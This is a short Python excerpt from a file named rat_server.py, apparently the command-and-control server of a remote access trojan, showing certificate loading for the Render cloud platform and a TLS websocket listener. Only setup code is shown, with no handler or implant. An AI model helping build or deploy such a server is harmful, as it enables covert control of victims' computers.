# In rat_server.py

async def main():
    # Render provides secret files at /etc/secrets/
    # We will use the local path as a fallback for testing on our own computer.
    secret_path = pathlib.Path("/etc/secrets/")
    local_path = pathlib.Path(__file__).with_name("certs")

    if secret_path.exists() and (secret_path / "cert.pem").exists():
        print("[*] Found Render secret files. Using production certificate.")
        certfile = secret_path / "cert.pem"
        keyfile = secret_path / "key.pem"
    else:
        print("[*] Could not find Render secret files. Using local development certificate.")
        certfile = local_path / "cert.pem"
        keyfile = local_path / "key.pem"

    try:
        ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ssl_context.load_cert_chain(certfile, keyfile)
    except FileNotFoundError:
        print(f"[!!!] FATAL ERROR: Certificate or key file not found at the expected path.")
        print(f"    - Tried Cert: {certfile}")
        print(f"    - Tried Key:  {keyfile}")
        return # Exit if we can't load the certs

    # Render assigns the port dynamically via the PORT environment variable.
    host = "0.0.0.0"
    port = int(os.environ.get("PORT", 8765))
    
    print(f"[*] Starting headless RAT server on wss://{host}:{port}")
    async with websockets.serve(handler, host, port, ssl=ssl_context, max_size=None):
        await asyncio.Future()